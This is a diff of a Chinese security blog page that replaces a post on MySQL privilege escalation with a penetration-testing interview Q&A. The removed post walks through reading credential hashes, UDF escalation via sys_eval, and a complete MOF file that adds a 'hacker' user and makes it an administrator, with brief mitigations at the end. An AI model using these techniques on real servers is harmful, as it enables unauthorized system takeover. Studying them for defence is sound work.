@@ -16,30 +16,22 @@
   <meta name="author" content="Rounuooo">
   <meta name="keywords" content="">
   
-    <meta name="description" content="低权限用户提升root前提：已经有一个低权限的webshell,想把低权限用户提升至root。 1.读取网站数据库配置文件(conn.php,config.php,dbconfig.php,config.inc.php,common.inc.php,inc,conn,config.sql,common,data sql,data,inc,config,conn,database,common,in">
+    <meta name="description" content="题目1.为何一个MYSQL数据库的站，只有一个80端口开放? 2.一个成熟并且相对安全的CMS，渗透时扫目录的意义? 3.在某后台新闻编辑界面看到编辑器，应该先做什么? 4.审查上传点的元素有什么意义? 5.CSRF、XSS及XXE有什么区别，以及修复方式? 6.3389无法连接的几种情况 7.列举出owasp top10 2019 8.说出至少三种业务逻辑漏洞，以及修复方式? 9.目标站无防护，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MySQL提权">
-<meta property="og:url" content="http://example.com/2022/10/31/MySQL%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:title" content="渗透测试面试题">
+<meta property="og:url" content="http://example.com/2022/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%A2%98/index.html">
 <meta property="og:site_name" content="Rounuooo的小站">
-<meta property="og:description" content="低权限用户提升root前提：已经有一个低权限的webshell,想把低权限用户提升至root。 1.读取网站数据库配置文件(conn.php,config.php,dbconfig.php,config.inc.php,common.inc.php,inc,conn,config.sql,common,data sql,data,inc,config,conn,database,common,in">
+<meta property="og:description" content="题目1.为何一个MYSQL数据库的站，只有一个80端口开放? 2.一个成熟并且相对安全的CMS，渗透时扫目录的意义? 3.在某后台新闻编辑界面看到编辑器，应该先做什么? 4.审查上传点的元素有什么意义? 5.CSRF、XSS及XXE有什么区别，以及修复方式? 6.3389无法连接的几种情况 7.列举出owasp top10 2019 8.说出至少三种业务逻辑漏洞，以及修复方式? 9.目标站无防护，">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/MySQL%E6%8F%90%E6%9D%83/image-20221031191149773.png">
-<meta property="og:image" content="http://example.com/images/MySQL%E6%8F%90%E6%9D%83/image-20221031191529895.png">
-<meta property="og:image" content="http://example.com/images/MySQL%E6%8F%90%E6%9D%83/image-20221031192130859.png">
-<meta property="og:image" content="http://example.com/images/MySQL%E6%8F%90%E6%9D%83/image-20221031192553805.png">
-<meta property="og:image" content="http://example.com/images/MySQL%E6%8F%90%E6%9D%83/image-20221031193037951.png">
-<meta property="article:published_time" content="2022-10-31T11:36:14.000Z">
-<meta property="article:modified_time" content="2022-10-31T11:43:39.693Z">
+<meta property="article:published_time" content="2022-11-01T01:36:30.000Z">
+<meta property="article:modified_time" content="2022-11-01T01:37:42.300Z">
 <meta property="article:author" content="Rounuooo">
-<meta property="article:tag" content="提升">
-<meta property="article:tag" content="渗透测试">
-<meta property="article:tag" content="MySQL">
+<meta property="article:tag" content="面试题">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/images/MySQL%E6%8F%90%E6%9D%83/image-20221031191149773.png">
   
   
   
-  <title>MySQL提权 - Rounuooo的小站</title>
+  <title>渗透测试面试题 - Rounuooo的小站</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -204,7 +196,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="MySQL提权"></span>
+            <span id="subtitle" data-typed-text="渗透测试面试题"></span>
           
         </div>
 
@@ -215,8 +207,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-10-31 19:36" pubdate>
-          2022年10月31日 晚上
+        <time datetime="2022-11-01 09:36" pubdate>
+          2022年11月1日 上午
         </time>
       </span>
     
@@ -227,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.1k 字
+          1.4k 字
         
       </span>
     
@@ -238,7 +230,7 @@
         
         
         
-          26 分钟
+          12 分钟
         
       </span>
     
@@ -276,82 +268,80 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">MySQL提权</h1>
+            <h1 style="display: none">渗透测试面试题</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="低权限用户提升root"><a href="#低权限用户提升root" class="headerlink" title="低权限用户提升root"></a>低权限用户提升root</h3><h5 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h5><p>已经有一个低权限的webshell,想把低权限用户提升至root。</p>
-<p>1.读取网站数据库配置文件(conn.php,config.php,dbconfig.php,config.inc.php,common.inc.php,inc,conn,config.sql,common,data sql,data,inc,config,conn,database,common,include）</p>
-<p>2.访问数据库安装路径(select @@basedir)下的   mysql&#x2F;user.myd)文件。</p>
+                <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>1.为何一个MYSQL数据库的站，只有一个80端口开放?</p>
+<p>2.一个成熟并且相对安全的CMS，渗透时扫目录的意义?</p>
+<p>3.在某后台新闻编辑界面看到编辑器，应该先做什么?</p>
+<p>4.审查上传点的元素有什么意义?</p>
+<p>5.CSRF、XSS及XXE有什么区别，以及修复方式?</p>
+<p>6.3389无法连接的几种情况</p>
+<p>7.列举出owasp top10 2019</p>
+<p>8.说出至少三种业务逻辑漏洞，以及修复方式?</p>
+<p>9.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403，什么原因?</p>
+<p>10.目标站禁止注册用户，找回密码处随便输入用户名提示:“此用户不存在”，你觉得这里怎样利用?</p>
+<h1 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h1><p>1.为何一个MYSQL数据库的站，只有一个80端口开放?</p>
 <ul>
-<li>覆盖这三个文件</li>
-<li>读取user.MYD文件，复制这段MD5值去解密（可能不全）</li>
-<li>mysql.ini添加：skip-grant-tables</li>
+<li>更改了端口，没有扫描出来；</li>
+<li>站库分离；</li>
+<li>3306端口不对外开放。</li>
 </ul>
-<p>直接读取数据库账号密码</p>
-<p>3 . 下载对方 user.frm &#x2F; user.MYD &#x2F; user.MYI 3个数据库文件到本地新建一个数据库,打开对应数据库的文件夹,导入这3张表,即可查看。</p>
-<p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031191149773.png" srcset="/img/loading.gif" lazyload alt="示例"></p>
-<h3 id="MySQL允许远程登陆"><a href="#MySQL允许远程登陆" class="headerlink" title="MySQL允许远程登陆"></a>MySQL允许远程登陆</h3><p>出现%代表可以远程登陆，一般只有三个用户  local host, 127.0.0.1,  ::1</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">on</span> *.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">grant</span> <span class="hljs-keyword">option</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031191529895.png" srcset="/img/loading.gif" lazyload alt="示例"></p>
-<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><h5 id="定义及使用条件："><a href="#定义及使用条件：" class="headerlink" title="定义及使用条件："></a>定义及使用条件：</h5><p>udf(Userdefined function)是用户自定义函数简写。(意义在于我们可以像使用version()函数一样方便)</p>
-<p>​		需要使用root权限，对于5.2以上的版本，将文件udf.dll导出到系统目录下，可以需要使用udf.dll来提权，还需secure_file_priv的设置不为NULL建执行系统命令的函数来调用执行cmd。</p>
-<p>在MySQL高版本中secure-file-priv参数限制了MySQL的导出:</p>
-<ol>
-<li>NULL，表示禁止</li>
-<li>如果value值有文件夹目录，则表示只允许该目录下文件（子目录都不行)</li>
-<li>如果为空(没有值)，则表示不限制目录</li>
-</ol>
-<p>MySQL5.0&#x2F;5.6版本: my.ini中无此参数，查询该参数情况为空，不限制目录</p>
-<p>MySQL5.7版本:my.ini中存在参数，查询该参数情况为NULL，不允许</p>
-<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">Show <span class="hljs-keyword">VARIABLES</span> like <span class="hljs-comment">&quot;%SECURE%&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031192130859.png" srcset="/img/loading.gif" lazyload alt="示例"></p>
-<p>现在基本上windows的服务器是以下两个路径导出UDF.DLL</p>
-<p>Mysql版本大于5.1版本。udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。(如果lib目录下没有plugin文件夹,就手动创建一个)</p>
-<p>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32</p>
-<h5 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h5><ul>
-<li>导入脚本提权: 使用msf自带的udf提权库，进行提权。</li>
-<li>先查询系统是什么版本 ,上传适合的dll包。 – select @@version_compile_os, @@version_compile_machine;</li>
-<li>创建表,添加内容进去。	– CREATE FUNCTION sys_eval RETURNS STRING SONAME ‘udf.dll’;</li>
-<li>查询是否添加成功：	– select * from mysql.func;</li>
-<li>执行命令 :		– select sys_eval(‘whoami’)</li>
+<p>2.一个成熟并且相对安全的CMS，渗透时扫目录的意义?</p>
+<ul>
+<li>敏感文件、二级目录扫描；</li>
+<li>站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点。</li>
 </ul>
-<h5 id="or使用PHP大马提权"><a href="#or使用PHP大马提权" class="headerlink" title="or使用PHP大马提权"></a>or使用PHP大马提权</h5><p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031192553805.png" srcset="/img/loading.gif" lazyload alt="示例"></p>
-<h3 id="MySQL–mof提权"><a href="#MySQL–mof提权" class="headerlink" title="MySQL–mof提权"></a>MySQL–mof提权</h3><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h5><p>​		在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将想要的操作通过代码存储到这个mof文件中，就可以实现权限提升。</p>
-<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a><strong>利用条件</strong></h5><ol>
-<li><strong>windows 03及以下版本</strong></li>
-<li>mysql启动身份具有权限去读写c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录</li>
-<li>secure-file-priv参数不为null</li>
-</ol>
-<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a><strong>利用方式</strong></h5><p>拿下webshell之后当前权限仅限于对网站文件的操作，想要获取对主机的操作还需进一步提权。</p>
-<p>使用sql语句，通过mysql的dumpfile操作将恶意mof文件拷贝到服务器的c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下，将系统当中默认的nullevt.mof给替换掉，进而让系统执行我们这个恶意的mof文件</p>
-<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;mof提权文件及路径&#x27;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;c:/windows/system32/wbem/mof/nullevt.mof&#x27;</span><br></code></pre></td></tr></table></figure>
-
-<h5 id="mof提权代码"><a href="#mof提权代码" class="headerlink" title="mof提权代码"></a>mof提权代码</h5><p><strong>nullevt.mof</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><br>instance of __EventFilter <span class="hljs-keyword">as</span> <span class="hljs-variable">$EventFilter</span><br>&#123;<br>    EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>;<br>    Name  = <span class="hljs-string">&quot;filtP2&quot;</span>;<br>    Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span><br>            <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br>            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;<br>    QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span>;<br>&#125;;<br><br>instance of ActiveScriptEventConsumer <span class="hljs-keyword">as</span> <span class="hljs-variable">$Consumer</span><br>&#123;<br>    Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>;<br>    ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>;<br>    ScriptText =<br>    <span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net user hacker 123456 /add\&quot;)&quot;</span>;<br>    <span class="hljs-comment">//cmd以system权限执行的语句</span><br>&#125;;<br><br>instance of __FilterToConsumerBinding<br>&#123;<br>    Consumer   = <span class="hljs-variable">$Consumer</span>;<br>    Filter = <span class="hljs-variable">$EventFilter</span>;<br>&#125;;<br></code></pre></td></tr></table></figure>
-
-<p>再将执行命令net user hacker 123456 &#x2F;add换为net localgroup administrators hacker &#x2F;add即可将hacker用户添加至administrators管理员组。</p>
-<h5 id="安全防范"><a href="#安全防范" class="headerlink" title="安全防范"></a>安全防范</h5><ol>
-<li>对mysql目录权限进行严格限制</li>
-<li>设置复杂的root账号密码</li>
-<li>设置c:&#x2F;windows&#x2F;system32&#x2F;wbem目录为不可写</li>
-</ol>
-<h3 id="反弹提权"><a href="#反弹提权" class="headerlink" title="反弹提权"></a>反弹提权</h3><h5 id="前提"><a href="#前提" class="headerlink" title="前提:"></a>前提:</h5><ol>
-<li>通过网站无法获取webshell</li>
-<li>Webshell无法执行命令</li>
-<li>有phpmyadmin和root账号，无法查询或者无法获取网站的真实路径</li>
-</ol>
-<h5 id="要求"><a href="#要求" class="headerlink" title="要求:"></a>要求:</h5><ol>
-<li>必须是一个root权限</li>
-<li>能写入相对应的plugin目录</li>
-<li>secure_file_priv 这个参数的值不能为NULL</li>
-</ol>
-<p><img src="/../images/MySQL%E6%8F%90%E6%9D%83/image-20221031193037951.png" srcset="/img/loading.gif" lazyload alt="示例"></p>
-<hr>
-<p>个人学习小结,具体测试利用方式需根据具体实践场景。</p>
+<p>3.在某后台新闻编辑界面看到编辑器，应该先做什么?</p>
+<ul>
+<li>查看编辑器的名称版本，然后搜索公开的漏洞</li>
+</ul>
+<p>4.审查上传点的元素有什么意义?</p>
+<ul>
+<li>有些站点的上传文件类型限制是在前端实现的，这时候只要增加上传类型就能突破限制了。</li>
+</ul>
+<p>5.CSRF、XSS及XXE有什么区别，以及修复方式?</p>
+<ul>
+<li>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</li>
+<li>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer。</li>
+<li>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</li>
+</ul>
+<p>6.3389无法连接的几种情况</p>
+<ul>
+<li>没有开放3389；</li>
+<li>端口被修改；</li>
+<li>防护拦截；</li>
+<li>处于内网（需要进行端口转发）</li>
+</ul>
+<p>7.列举出owasp top10 2019</p>
+<ul>
+<li>注入</li>
+<li>失效的身份认证</li>
+<li>敏感信息泄露</li>
+<li>XML外部实体(XXE)</li>
+<li>失效的访问控制</li>
+<li>安全配置错误</li>
+<li>跨站脚本(XSS)</li>
+<li>不安全的反序列化</li>
+<li>使用含有已知漏洞的组件</li>
+<li>不足的日志记录和监控</li>
+</ul>
+<p>8.说出至少三种业务逻辑漏洞，以及修复方式?</p>
+<ul>
+<li>密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、阔以跳过验证步骤、找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码；</li>
+<li>身份认证漏洞中最常见的是会话固定攻击和cookie仿冒，只要得到session或cookie即可伪造用户身份；</li>
+<li>验证码漏洞中存在验证码允许暴力破解、验证码可以通过JavaScript或者改包的方法来绕过。</li>
+</ul>
+<p>9.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403，什么原因?</p>
+<ul>
+<li>原因有很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过。</li>
+</ul>
+<p>10.目标站禁止注册用户，找回密码处随便输入用户名提示:“此用户不存在”，你觉得这里怎样利用?</p>
+<ul>
+<li>先爆破用户名,再利用被爆破出来的用户名爆破密码;其实有些站点,在登陆处也会这样提示;所有和数据库交互的地方都有可能有注入。</li>
+</ul>
 
                 
               </div>
@@ -370,7 +360,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%86%85%E7%BD%91/" class="category-chain-item">内网</a>
+  <a href="/categories/%E9%9D%A2%E8%AF%95/" class="category-chain-item">面试</a>
   
   
 
@@ -385,11 +375,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%8F%90%E5%8D%87/">#提升</a>
-      
-        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>
-      
-        <a href="/tags/MySQL/">#MySQL</a>
+        <a href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/">#面试题</a>
       
     </div>
   
@@ -401,8 +387,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>MySQL提权</div>
-      <div>http://example.com/2022/10/31/MySQL提权/</div>
+      <div>渗透测试面试题</div>
+      <div>http://example.com/2022/11/01/渗透测试面试题/</div>
     </div>
     <div class="license-meta">
       
@@ -414,7 +400,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年10月31日</div>
+          <div>2022年11月1日</div>
         </div>
       
       
@@ -446,18 +432,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%A2%98/" title="渗透测试面试题">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">渗透测试面试题</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/10/28/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="meterpreter学习笔记">
-                        <span class="hidden-mobile">meterpreter学习笔记</span>
+                      <a href="/2022/10/31/MySQL%E6%8F%90%E6%9D%83/" title="MySQL提权">
+                        <span class="hidden-mobile">MySQL提权</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
